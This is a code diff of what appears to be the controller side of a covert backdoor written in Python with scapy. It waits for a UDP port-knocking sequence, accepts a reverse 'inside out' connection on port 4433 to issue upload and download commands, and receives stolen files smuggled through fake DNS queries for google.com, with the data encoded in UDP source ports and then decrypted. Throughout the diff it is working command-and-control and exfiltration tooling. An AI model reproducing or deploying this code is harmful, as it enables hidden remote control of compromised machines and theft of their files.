@@ -4,13 +4,14 @@ from socket import *
 import os.path
 import knocker
 from scapy.all import *
-from dcutils import decrypt
+from utils import decrypt, parse_port_to_data
 
 EOF = 'G'
 PATH_TO_FILE = "./data/"
 CONTENT = ""
 DOWNLOAD_FILE_SIZE = 0
 DOWNLOAD_FILE_NAME = ""
+PORT = 4433  # port for inside out connection
 
 def upload(conn,command,filepath):
     if os.path.isfile(filepath):
@@ -36,6 +37,34 @@ def download(conn, filepath):
         global DOWNLOAD_FILE_NAME
         DOWNLOAD_FILE_NAME = filepath.split('/')[-1]
         sniff(filter="udp", stop_filter=parse_for_download)
+
+def parse_for_download(pkt):
+    return_value = False
+    if pkt.haslayer(DNS) and pkt['DNS'].qd[DNSQR].qname == "google.com." :
+        data1, data2 = parse_port_to_data(pkt['UDP'].sport)
+        return_value = parse_by_character(data1)
+        return_value = return_value or parse_by_character(data2)
+    return return_value
+
+def parse_by_character(char):
+    global CONTENT
+    global DOWNLOAD_FILE_SIZE
+    if char == EOF:
+        if DOWNLOAD_FILE_SIZE == str(len(CONTENT)):
+            decrypted = decrypt(CONTENT , knocker.PASS)
+            global PATH_TO_FILE
+            global DOWNLOAD_FILE_NAME
+            if not os.path.exists(PATH_TO_FILE):
+                os.makedirs(PATH_TO_FILE)
+            with open(PATH_TO_FILE +DOWNLOAD_FILE_NAME, 'w') as f:
+                f.write(decrypted)
+            print "data is successfully saved to " + PATH_TO_FILE + DOWNLOAD_FILE_NAME
+        else:
+            print "some data is missing. cannot decrypt the file"
+        return True
+    else:
+        CONTENT += char
+        return False
 
 
 def accept_commands(conn):
@@ -65,9 +94,9 @@ def accept_commands(conn):
 
 
 
-def listen():
+def listen_for_inside_out_conn():
     HOST = ''  # '' means bind to all interfaces
-    PORT = 4433  # port
+    global PORT
     # create our socket handler
     s = socket.socket(AF_INET, SOCK_STREAM)
     # set is so that when we cancel out we can reuse port
@@ -88,42 +117,7 @@ def listen():
     conn.close()
     s.close()
 
-
-def parse_for_download(pkt):
-    return_value = False
-    if pkt.haslayer(DNS) and pkt['DNS'].qd[DNSQR].qname == "google.com." :
-        srcPort = hex(pkt['UDP'].sport)
-        if pkt['UDP'].sport > 4095:
-            return_value = parse_by_character(chr(int(srcPort[2:4], 16)))
-            return_value = return_value or parse_by_character(chr(int(srcPort[4:], 16)))
-        else:
-            return_value = parse_by_character(chr(int(srcPort[2], 16)))
-            return_value = return_value or parse_by_character(chr(int(srcPort[3:], 16)))
-    return return_value
-
-
-def parse_by_character(char):
-    global CONTENT
-    global DOWNLOAD_FILE_SIZE
-    if char == EOF:
-        print len(CONTENT)
-        if DOWNLOAD_FILE_SIZE == str(len(CONTENT)):
-            decrypted = decrypt(CONTENT , knocker.PASS)
-            global PATH_TO_FILE
-            global DOWNLOAD_FILE_NAME
-            if not os.path.exists(PATH_TO_FILE):
-                os.makedirs(PATH_TO_FILE)
-            with open(PATH_TO_FILE +DOWNLOAD_FILE_NAME, 'w') as f:
-                f.write(decrypted)
-            print "data is successfully saved to " + PATH_TO_FILE + DOWNLOAD_FILE_NAME
-        else:
-            print "some data is missing. cannot decrypt the file"
-        return True
-    else:
-        CONTENT += char
-        return False
-
-def parse(pkt):
+def parse_packets_for_port_knocking(pkt):
     if pkt.haslayer(UDP) and pkt['UDP'].dport == knocker.PORT_KNOCKER[knocker.PORT_KNOCKER_INDEX]:
         knocker.port_knock(pkt)
         if len(knocker.PASS) == len(knocker.PORT_KNOCKER)*2:
@@ -133,8 +127,8 @@ def parse(pkt):
 
 
 def main():
-    sniff(filter="udp", stop_filter=parse)
-    listen()
+    sniff(filter="udp", stop_filter=parse_packets_for_port_knocking)
+    listen_for_inside_out_conn()
 
 if __name__ == '__main__':
     main()
